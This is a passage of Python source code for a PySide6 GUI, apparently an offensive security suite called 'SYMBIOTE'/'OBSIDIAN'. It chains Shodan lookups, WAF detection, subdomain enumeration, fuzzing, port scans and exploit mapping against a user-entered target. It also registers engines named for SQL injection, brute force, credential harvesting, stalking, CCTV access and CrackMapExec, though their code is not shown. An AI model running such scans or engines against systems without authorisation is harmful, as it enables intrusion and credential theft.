                    target, ok = QInputDialog.getText(self, "Habu Network", "Target IP/Hostname:")
                    if ok and target:
                        ops, ok2 = QInputDialog.getText(self, "Habu Operations", "Operations (comma-separated: dns,geo,asn,ports,tcp_connect):", text="dns,geo,ports")
                        if ok2: params["net_ops"] = [o.strip() for s in ops.split(",") for o in s.split() if o.strip()]
                    else: return

                elif module == "crypto":
                    data, ok = QInputDialog.getText(self, "Habu Crypto", "Data Input (string or hash):")
                    if ok and data:
                        params["data_input"] = data
                        ops, ok2 = QInputDialog.getText(self, "Habu Operations", "Operations (comma-separated: hash_all,identify,crack,b64_encode):", text="hash_all,identify")
                        if ok2: params["crypto_ops"] = [o.strip() for s in ops.split(",") for o in s.split() if o.strip()]
                    else: return

                elif module == "fernet":
                    ops = ["keygen", "encrypt", "decrypt"]
                    op, ok = QInputDialog.getItem(self, "Habu Fernet", "Select Operation:", ops, 0, False)
                    if ok:
                        params["fernet_op"] = op
                        if op in ("encrypt", "decrypt"):
                            key, ok2 = QInputDialog.getText(self, "Habu Fernet", "Key:")
                            if ok2 and key: params["fernet_key"] = key
                            else: return
                            
                            prompt = "Plaintext:" if op == "encrypt" else "Ciphertext:"
                            val, ok3 = QInputDialog.getText(self, "Habu Fernet", prompt)
                            if ok3 and val:
                                if op == "encrypt": params["plaintext"] = val
                                else: params["ciphertext"] = val
                            else: return
                    else: return

                elif module == "shodan":
                    query, ok = QInputDialog.getText(self, "Habu Shodan", "Query (IP or Search):")
                    if ok and query:
                        params["shodan_query"] = query
                        modes = ["host", "search", "count"]
                        mode, ok2 = QInputDialog.getItem(self, "Habu Shodan", "Mode:", modes, 0, False)
                        if ok2: params["shodan_mode"] = mode
                    else: return

                self._run_unified_engine("habu", target or "local", params, display_name=f"HABU:{module.upper()}")

            elif name == "DIRSEARCH":
                url, ok = QInputDialog.getText(self, "Dirsearch", "Target URL:", text="http://")
                if ok:
                    self._run_unified_engine("dirsearch", url)

            elif name == "SELENIUM":
                url, ok = QInputDialog.getText(self, "Selenium", "Target URL:", text="http://")
                if ok:
                    self._run_unified_engine("selenium", url)

            else:
                self.log(f"[{name}] Module loaded.", AETHER_COLORS["accent_info"])

        except Exception as e:
            self.log(f"Toolkit Failure: {e}", AETHER_COLORS["accent_error"])

    def term_log(self, text):
        self.log(text)

    def init_toolkit(self):
        self.toolkit = ToolkitPage()
        # Add shodan and pyshark to tools list if needed
        self.stack.addWidget(self.toolkit)


class ToolEngineWorker(QThread):
    """
    Safely bridges asyncio Engine streams (BaseEngine.stream) into PySide6 GUI signals.
    Eliminates cross-thread QPainter crashes completely.
    """
    progress = Signal(str, str) # (text, severity)
    finished = Signal()
    error = Signal(str)

    def __init__(self, engine, request, parent=None):
        super().__init__(parent)
        self.engine = engine
        self.request = request
        self._loop = None

    def run(self):
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        
        async def _execute():
            if not self.engine._ready:
                await self.engine.initialize()
            
            try:
                async for evt in self.engine.stream(self.request):
                    msg = str(evt.data)
                    sev = getattr(evt, 'severity', "INFO")
                    self.progress.emit(msg, sev)
            except Exception as e:
                self.error.emit(str(e))
                
        self._loop.run_until_complete(_execute())
        self._loop.close()
        self.finished.emit()

class ScanWorker(QThread):
    progress = Signal(str)
    finished = Signal(list)

    def __init__(self, target, engines, mode=ScanMode.FULL):
        super().__init__()
        self.target = target
        self.engines = engines
        self.mode = mode

    def run(self):
        findings = []
        self.progress.emit(f"Initiating {self.mode.value} Scan on {self.target}...")

        if self.mode in [ScanMode.NETWORK, ScanMode.FULL]:
            # 0. Local Network Discovery
            if self.target.lower() in ["local", "network", "localhost", "127.0.0.1"]:
                self.progress.emit("Scanning local network assets...")
                assets = self.engines["discovery"].get_local_assets()
                for asset in assets:
                    self.progress.emit(f"<b style='color:#00ff41'>[ASSET] Connected: {asset['ip']} ({asset['mac']})</b>")

        # 1. Shodan OSINT (If API Key Present)
        if self.mode in [ScanMode.NETWORK, ScanMode.FULL]:
            shodan_key = os.getenv("SHODAN_API_KEY") or self.engines["settings"].data.get("shodan_key")
            if shodan_key:
                try:
                    self.progress.emit("Querying Shodan Intelligence...")
                    api = shodan.Shodan(shodan_key)
                    host = api.host(self.target)
                    self.progress.emit(f"<b style='color:#39ff14'>[SHODAN] OS: {host.get('os', 'Unknown')}</b>")
                    self.progress.emit(f"<b style='color:#39ff14'>[SHODAN] Ports: {host['ports']}</b>")
                except:
                    pass

        # 2. WAF Detection
        if self.mode in [ScanMode.WEB, ScanMode.FULL]:
            waf = self.engines["waf"].detect(self.target)
            if waf:
                self.progress.emit(f"<b style='color:orange'>[FIREWALL] Detected: {waf}</b>")

        # 2. Subdomain Enum
        if self.mode in [ScanMode.WEB, ScanMode.FULL]:
            subs = self.engines["subdomain"].scan(self.target)
            if subs:
                self.progress.emit(
                    f"<b style='color:cyan'>[SUB] Found {len(subs)} subdomains</b>"
                )

        # 3. CORS Audit
        if self.mode in [ScanMode.WEB, ScanMode.FULL]:
            self.progress.emit("Auditing CORS policy...")
            cors = self.engines["cors"].audit(f"http://{self.target}")
            if cors:
                findings.append(cors)

        # 4. Router Assessment
        if self.mode in [ScanMode.NETWORK, ScanMode.FULL]:
            self.progress.emit("Checking for edge device vulnerabilities...")
            router_vulns = self.engines["router"].assess(self.target)
            findings.extend(router_vulns)

        # 5. Fuzzing
        if self.mode in [ScanMode.WEB, ScanMode.FULL]:
            self.progress.emit("Starting endpoint fuzzing...")
            fuzz_vulns = self.engines["fuzzer"].fuzz(
                f"http://{self.target}", 
                callback=self.progress.emit,
                wordlist_path=self.engines["settings"].data.get("fuzz_wordlist")
            )
            findings.extend(fuzz_vulns)

        # 6. Port Scan & Templates
        if self.mode in [ScanMode.NETWORK, ScanMode.SYSTEM, ScanMode.FULL]:
            net = self.engines["network"].scan_host(
                self.target, callback=self.progress.emit
            )
            for p in net["ports"]:
                findings.append(
                    Vulnerability(
                        id=f"PORT-{p}",
                        title=f"Port {p} Open",
                        description="Service detected",
                        severity=Severity.INFO,
                        category="network",
                        target=f"{net['ip']}:{p}",
                    )
                )

        if self.mode in [ScanMode.WEB, ScanMode.FULL]:
            tpl = self.engines["template"].scan_target(
                self.target, callback=self.progress.emit
            )
            findings.extend(tpl)

        # 6. Exploit Mapping
        for v in findings:
            ex = self.engines["mapper"].map_exploits(v.id)
            if ex:
                v.remediation += f"\nPotential Exploits/Tools: {', '.join(ex)}"

        self.finished.emit(findings)


# ==================== MAIN INTERFACE ====================


class SYMBIOTEApp(QMainWindow):
    log_signal = Signal(str, str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("SYMBIOTE VULN SUITE v4.0")
        self.resize(1300, 860)
        self.setStyleSheet(STYLING)
        self.db = ScanDatabase()
        self.settings = SettingsManager()
        
        self.engines = {
            "packet": PacketEngine(),
            "template": TemplateEngine(),
            "nmap": NmapEngine(),
            "network": NetworkScanner(),
            "web": WebScanner(),
            "waf": WafDetector(),
            "subdomain": SubdomainScanner(),
            "cors": CorsScanner(),
            "fuzzer": FuzzEngine(),
            "mapper": ExploitMapper(),
            "discovery": NetworkDiscoveryScanner(),
            "router": RouterAssessor(),
            "settings": self.settings,
            "sqli": SQLiEngine(),
            "brute": BruteForceEngine(),
            "wifi": WiFiEngine(),
            "harvester": CredentialHarvester(),
            "stalk": StalkEngine(),
            "cctv_cam": CCTVCamEngine(),
            "crackmapexec": CrackMapExecEngine(),
            "xsstrike": XSStrikeEngine(),
            "httpie": HTTPieEngine(),
            "photon": PhotonEngine(),
            "wapiti": self._lazy_wapiti(),
            "libdnet": LibdnetEngine(),
            "dpkt": DpktEngine(),
            "bloodhound": BloodHoundEngine(),
            "spoodle": SpoodleEngine(),
            "habu": HabuEngine(),
            "dirsearch": DirsearchEngine(),
            "selenium": SeleniumEngine(),
        }
        self.log_signal.connect(self._safe_log)
        self.init_ui()
        self.update_stats()
        
        # Subscribe to Global Event Bus for real-time engine feedback
        from registry.event_bus import bus
        bus.subscribe("*", self._on_bus_event)

    @staticmethod
    def _lazy_wapiti():
        """Deferred import to avoid PySide6/httpx conflict at startup."""
        try:
            from engines.intruder.wapiti_engine import WapitiEngine
            return WapitiEngine()
        except Exception:
            return None

    def _safe_log(self, text, color):
        if hasattr(self, "term") and self.term:
            self.term.log(text, color)
        else:
            print(f"[{color}] {text}")

    def _on_bus_event(self, event):
        # Route engine events to terminal
        sev_color = AETHER_COLORS["accent_info"]
        if event.severity == "WARN": sev_color = AETHER_COLORS["accent_warning"]
        elif event.severity == "ALERT": sev_color = AETHER_COLORS["accent_error"]
        elif event.severity == "CRITICAL": sev_color = AETHER_COLORS["accent_error"]
        
        if isinstance(event.data, dict) and "msg" in event.data:
            msg = f"[{event.topic.upper()}] {event.data['msg']}"
        else:
            msg = f"[{event.topic.upper()}] {event.data}"
        
        # Filter noise from initialization if user hasn't interacted yet
        if any(x in msg.lower() for x in ["initialized", "ready", "warmup"]):
            return
            
        self.log_signal.emit(msg, sev_color)

    def init_ui(self):
        c = QWidget()
        l = QHBoxLayout(c)
        l.setContentsMargins(0, 0, 0, 0)
        l.setSpacing(0)
        self.setCentralWidget(c)
        # Sidebar
        self.sb = QFrame()
        self.sb.setObjectName("Sidebar")
        self.sb.setFixedWidth(220)
        sl = QVBoxLayout(self.sb)
        logo = PRO_LABEL("OBSIDIAN")
        logo.setObjectName("Title")
        logo.setAlignment(Qt.AlignCenter)
        sl.addWidget(logo)
        sl.addSpacing(20)
        self.btns = []
        for i, (t, icon) in enumerate(
            [
                ("DASHBOARD", "fa5s.chalkboard"),
                ("RECONNAISSANCE", "fa5s.search-plus"),
                ("INTRUDER PACK", "fa5s.box-open"),
                ("HISTORY", "fa5s.file-alt"),
                ("SETTINGS", "fa5s.cog"),
            ]
        ):
            b = QPushButton(f" {t}")
            b.setObjectName("MenuBtn")
            b.setIcon(qta.icon(icon, color=AETHER_COLORS["text_sec"]))
            b.setFixedHeight(55)
            b.clicked.connect(lambda ch, x=i: self.switch_page(x))
            
            # Add subtle hover animation logic
            b.enterEvent = lambda e, btn=b: self.animate_btn(btn, True)
            b.leaveEvent = lambda e, btn=b: self.animate_btn(btn, False)
            
            sl.addWidget(b)
            self.btns.append(b)
        sl.addStretch()
        l.addWidget(self.sb)
        # Stack
        self.stack = QStackedWidget()
        l.addWidget(self.stack)
        self.init_dash()
        self.init_center()
        self.init_toolkit()
        self.init_history()
        self.init_settings()
        self.switch_page(0)

    def switch_page(self, i):
        for idx, b in enumerate(self.btns):
            b.setProperty("active", "true" if idx == i else "false")
            b.setStyle(b.style())
        
        # Smooth Fade-in Transition
        old_page = self.stack.currentWidget()
        self.stack.setCurrentIndex(i)
        new_page = self.stack.currentWidget()
        
        self.apply_fade(new_page)
        if i == 0: # Dashboard staggered entrance
            self.stagger_dashboard()

    def apply_fade(self, widget, duration=600):
        from PySide6.QtWidgets import QGraphicsOpacityEffect
        # Remove old effect if exists to avoid conflicts
        if widget.graphicsEffect():
            widget.setGraphicsEffect(None)
            
        op = QGraphicsOpacityEffect(widget)
        widget.setGraphicsEffect(op)
        
        anim = QPropertyAnimation(op, b"opacity", op)
        anim.setDuration(duration)
        anim.setStartValue(0.0)
        anim.setEndValue(1.0)
        anim.setEasingCurve(QEasingCurve.InOutCubic)
        anim.start(QPropertyAnimation.DeleteWhenStopped)
        widget._fade_ref = anim # Extra safety

    def stagger_dashboard(self):
        # Find ObsidianFrames in the dashboard and animate them
        dash_page = self.stack.widget(0)
        frames = dash_page.findChildren(ObsidianFrame)
        for i, frame in enumerate(frames):
            QTimer.singleShot(i * 100, lambda f=frame: self.animate_entrance(f))

    def animate_entrance(self, widget):
        pos = widget.pos()
        if hasattr(widget, "_entrance_done"): return
        widget._entrance_done = True
        
        orig_y = pos.y()
        widget.move(pos.x(), orig_y + 30)
        
        anim = QPropertyAnimation(widget, b"pos", widget)
        anim.setDuration(700)
        anim.setStartValue(QPoint(pos.x(), orig_y + 30))
        anim.setEndValue(QPoint(pos.x(), orig_y))
        anim.setEasingCurve(QEasingCurve.OutBack)
        anim.start(QPropertyAnimation.DeleteWhenStopped)
        self.apply_fade(widget, 800)

    def animate_btn(self, btn, hovering):
        anim = QPropertyAnimation(btn, b"minimumWidth") # Just to trigger redraw or move
        # Better: change style via property
        btn.setProperty("hover", "true" if hovering else "false")
        btn.setStyle(btn.style())
        
    def init_dash(self):
        p = QWidget()
        l = QVBoxLayout(p)
        l.setContentsMargins(30, 30, 30, 30)
        
        dashboard_card = QFrame()
        dashboard_card.setObjectName("Card")
        dl = QVBoxLayout(dashboard_card)
        dl.setContentsMargins(30, 30, 30, 30)
        
        mid = QHBoxLayout()
        dl.addLayout(mid)
        # Professional Branding HUD
        branding_box = ObsidianFrame(accent_color=AETHER_COLORS["border_active"])
        tl = QVBoxLayout(branding_box)
        tl.addWidget(ProBrandingHUD())
        mid.addWidget(branding_box, 2)

        # Stats
        self.stat_lbls = {}
        sl_frame = ObsidianFrame(accent_color=AETHER_COLORS["border_active"])
        sl = QVBoxLayout(sl_frame)
        for k in ["SCANS", "VULNS", "CRITICAL"]:
            f = QWidget()
            fl = QVBoxLayout(f)
            v = QLabel("0", objectName="StatValue")
            n = QLabel(k, objectName="StatLabel")
            fl.addWidget(v)
            fl.addWidget(n)
            sl.addWidget(f)
            self.stat_lbls[k] = v
        mid.addWidget(sl_frame, 1)

        # Telemetry Background
        self.telemetry = TelemetryPulseWidget()
        dl.addWidget(self.telemetry)

        # Enterprise Credit (Typing Effect)
        self.credit_label = PRO_LABEL("")
        self.full_credit = "ENTERPRISE VERSION: OBSIDIAN PRO"
        self.credit_index = 0
        self.credit_label.setAlignment(Qt.AlignCenter)
        self.credit_label.setStyleSheet(f"color: {AETHER_COLORS['text_sec']}; font-weight: 700; letter-spacing: 2px; margin-top: 20px;")
        dl.addWidget(self.credit_label)
        
        self.type_timer = QTimer(self)
        self.type_timer.timeout.connect(self.update_typing)
        self.type_timer.start(100)

        l.addWidget(dashboard_card)
        self.stack.addWidget(p)

    def update_typing(self):
        if self.credit_index < len(self.full_credit):
            self.credit_index += 1
            self.credit_label.setText(self.full_credit[:self.credit_index])
        else:
            self.type_timer.stop()

    def init_center(self):
        p = QWidget()
        l = QVBoxLayout(p)
        l.setContentsMargins(30, 30, 30, 30)
        
        header = QHBoxLayout()
        self.op_lbl = QLabel("READY FOR PROBE")
        self.op_lbl.setStyleSheet(f"color: {AETHER_COLORS['accent_primary']}; font-weight: 700; letter-spacing: 2px;")
        header.addWidget(self.op_lbl)
        header.addStretch()
        
        # Mode Selection
        self.mode_tabs = QTabBar()
        self.mode_tabs.addTab("FULL SCAN")
        self.mode_tabs.addTab("WEB")
        self.mode_tabs.addTab("NETWORK")
        self.mode_tabs.addTab("SYSTEM")
        self.mode_tabs.setStyleSheet(f"""
            QTabBar::tab {{
                background: transparent;
                color: {AETHER_COLORS['text_sec']};
                padding: 12px 30px;
                border-bottom: 2px solid transparent;
            }}
            QTabBar::tab:selected {{
                color: {AETHER_COLORS['accent_primary']};
                border-bottom: 2px solid {AETHER_COLORS['accent_primary']};
            }}
        """)
        header.addWidget(self.mode_tabs)
        l.addLayout(header)

        row = QHBoxLayout()
        l.addLayout(row)
        self.target = QLineEdit()
        self.target.setPlaceholderText("ENTER TARGET URL OR IP...")
        row.addWidget(self.target, 3)
        eb = QPushButton("LAUNCH PROBE")
        eb.setObjectName("ProBtn")
        eb.clicked.connect(self.start_scan)
        row.addWidget(eb, 1)
        
        # Action Pulse Animation
        self.action_btn = eb
        self.pulse_timer = QTimer(self)
        self.pulse_timer.timeout.connect(self.pulse_action_btn)
        self.pulse_timer.start(1000)
        self.progress = QProgressBar()
        self.progress.setFixedHeight(4)
        self.progress.setTextVisible(False)
        l.addWidget(self.progress)
        self.term = TerminalWidget()
        l.addWidget(self.term)
        self.table = QTableWidget(0, 4)
        self.table.setHorizontalHeaderLabels(["SEV", "ID", "TITLE", "TARGET"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        l.addWidget(self.table)
        self.stack.addWidget(p)

    def pulse_action_btn(self):
        if not hasattr(self, 'action_btn'): return
        eff = QGraphicsDropShadowEffect(self.action_btn)
        eff.setBlurRadius(15)
        eff.setColor(to_qcolor(AETHER_COLORS["accent_primary"], 150))
        eff.setOffset(0, 0)
        self.action_btn.setGraphicsEffect(eff)
        
        anim = QPropertyAnimation(eff, b"blurRadius")
        anim.setDuration(800)
        anim.setStartValue(5)
        anim.setEndValue(25)
        anim.setEasingCurve(QEasingCurve.InOutSine)
        anim.start(QPropertyAnimation.DeleteWhenStopped)

    def init_settings(self):
        p = QWidget()
        l = QVBoxLayout(p)
        l.setContentsMargins(30, 30, 30, 30)
        l.addWidget(QLabel("SYSTEM CONFIGURATION", objectName="Title"))
        
        # Initialize Tab Widget for 8 categories
        from PySide6.QtWidgets import QTabWidget
        self.settings_tabs = QTabWidget()
        self.settings_tabs.setObjectName("ObsidianTabs")
        self.settings_tabs.setStyleSheet(f"""
            QTabWidget::pane {{ border: 1px solid {AETHER_COLORS['border_subtle']}; background: {AETHER_COLORS['bg_void']}; }}
            QTabBar::tab {{ background: {AETHER_COLORS['bg_main']}; color: {AETHER_COLORS['text_sec']}; padding: 12px 25px; border: 1px solid {AETHER_COLORS['border_subtle']}; border-bottom: none; }}
            QTabBar::tab:selected {{ background: {AETHER_COLORS['bg_panel']}; color: {AETHER_COLORS['accent_primary']}; border-bottom: 2px solid {AETHER_COLORS['accent_primary']}; }}
        """)
        
        # Helper to create a tab page
        def create_tab(name, layout_items):
            w = QWidget()
            wl = QVBoxLayout(w)
            wl.setSpacing(15)
            for item in layout_items:
                if isinstance(item, tuple):
                    lbl, widget = item
                    wl.addWidget(QLabel(lbl, objectName="StatLabel"))
                    wl.addWidget(widget)
                else:
                    wl.addWidget(item)
            wl.addStretch()
            self.settings_tabs.addTab(w, name)
            return w

        # Tab 1: Engine Manager
        create_tab("Engine Manager", [QLabel("Manage the activation state of the 24 Core Engines.")])
        
        # Tab 2: Network & Proxy
        create_tab("Network & Proxy", [QLabel("Global Proxy Settings (HTTP/SOCKS5)")])
        
        # Tab 3: Intruder Config
        self.set_fuzz = QLineEdit()
        self.set_fuzz.setText(self.settings.data.get("fuzz_wordlist", ""))
        create_tab("Intruder Config", [("CUSTOM FUZZ WORDLIST (PATH)", self.set_fuzz)])
        
        # Tab 4: Recon Profiles
        self.set_shodan = QLineEdit()
        self.set_shodan.setEchoMode(QLineEdit.Password)
        self.set_shodan.setText(self.settings.data.get("shodan_key", ""))
        create_tab("Recon Profiles", [("SHODAN API KEY", self.set_shodan)])
        
        # Tab 5: Dashboard Display
        create_tab("Dashboard Display", [QLabel("WebSocket Telemetry UI Tweaks.")])
        
        # Tab 6: Security & Audit
        create_tab("Security & Audit", [QLabel("Compliance & Event logging details.")])
        
        # Tab 7: Plugins
        create_tab("Plugins", [QLabel("Manage Custom Python Scripts.")])
        
        # Tab 8: Advanced/Developer
        create_tab("Advanced/Developer", [QLabel("Raw Engine Flags (Expert use only).")])

        l.addWidget(self.settings_tabs)
        
        save_btn = QPushButton("SAVE CONFIGURATION")
        save_btn.setObjectName("ProBtn")
        save_btn.clicked.connect(self.save_settings)
        l.addWidget(save_btn)
        self.stack.addWidget(p)

    def save_settings(self):
        data = {
            "shodan_key": self.set_shodan.text(),
            "fuzz_wordlist": self.set_fuzz.text()
        }
        self.settings.save(data)
        QMessageBox.information(self, "Settings", "Configuration saved.")


    def init_toolkit(self):
        self.toolkit = ToolkitPage(parent_app=self)
        self.stack.addWidget(self.toolkit)

    def init_history(self):
        p = QWidget()
        l = QVBoxLayout(p)
        l.setContentsMargins(30, 30, 30, 30)
        l.addWidget(QLabel("LOG ARCHIVE", objectName="Title"))
        self.hist_table = QTableWidget(0, 4)
        self.hist_table.setHorizontalHeaderLabels(["TS", "TARGET", "TYPE", "COUNT"])
        self.hist_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        l.addWidget(self.hist_table)
        self.stack.addWidget(p)

    def update_stats(self):
        s = self.db.get_stats()
        self.stat_lbls["SCANS"].setText(str(len(self.db.data["scans"])))
        self.stat_lbls["VULNS"].setText(str(s["total"]))
        self.stat_lbls["CRITICAL"].setText(str(s["by_severity"].get("CRITICAL", 0)))
        self.hist_table.setRowCount(0)
        for x in self.db.data["scans"][::-1]:
            r = self.hist_table.rowCount()
            self.hist_table.insertRow(r)
            self.hist_table.setItem(r, 0, QTableWidgetItem(x["timestamp"][:16]))
            self.hist_table.setItem(r, 1, QTableWidgetItem(x["target"]))
            self.hist_table.setItem(r, 2, QTableWidgetItem(x["type"]))
            self.hist_table.setItem(r, 3, QTableWidgetItem(str(x["findings_count"])))

    def start_scan(self):
        t = self.target.text()
        if not t:
            return
        
        modes = [ScanMode.FULL, ScanMode.WEB, ScanMode.NETWORK, ScanMode.SYSTEM]
        selected_mode = modes[self.mode_tabs.currentIndex()]
        
        self.term.log(f"Initiating {selected_mode.value} scan on {t}...", AETHER_COLORS["accent_primary"])
        self.worker = ScanWorker(t, self.engines, mode=selected_mode)
        self.worker.progress.connect(self.term.log)
        self.worker.finished.connect(self.scan_done)
        self.worker.start()

    def scan_done(self, results):
        modes = [ScanMode.FULL, ScanMode.WEB, ScanMode.NETWORK, ScanMode.SYSTEM]
        selected_mode = modes[self.mode_tabs.currentIndex()]
        
        self.term.log("Scan complete.", AETHER_COLORS["accent_success"])
        self.db.add_scan(self.target.text(), selected_mode.value.lower(), results)
        self.update_stats()
        self.table.setRowCount(0)
        for v in results:
            r = self.table.rowCount()
            self.table.insertRow(r)
            it = QTableWidgetItem(v.severity.name)
            it.setForeground(QColor(v.severity.color()))
            self.table.setItem(r, 0, it)
            self.table.setItem(r, 1, QTableWidgetItem(v.id))
            self.table.setItem(r, 2, QTableWidgetItem(v.title))
            self.table.setItem(r, 3, QTableWidgetItem(v.target))


if __name__ == "__main__":
    import os
    import sys
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    
    from registry.event_bus import bus
    from registry.engine_registry import registry
    from registry.health_aggregator import HealthAggregator
    from server.ws_server import WSServer
    
    print("[BOOT] Loading engine registry...")
    registry.load_all()

    loaded = registry.list_ids()
    errors = registry.errors()
    print(f"[BOOT] Engines loaded: {len(loaded)}  |  Errors: {len(errors)}")
    if errors:
        for mod, err in errors.items():
            print(f"  [WARN] {mod}: {err}")

    print("[BOOT] Starting health aggregator...")
    aggregator = HealthAggregator(registry=registry, bus=bus, interval=5.0)
    aggregator.start()

    print("[BOOT] Starting WebSocket server on :9999...")
    ws = WSServer(port=9999)
    ws.start()

    bus.emit("app.started", {"engines": len(loaded), "errors": len(errors)}, source="main")

    app = QApplication.instance() or QApplication(sys.argv)
    win = SYMBIOTEApp()
    
    # Wire new engines into the window's existing engines dict
    for engine_id, engine in registry._engines.items():
        win.engines[engine_id] = engine
        
    win.show()
    sys.exit(app.exec())
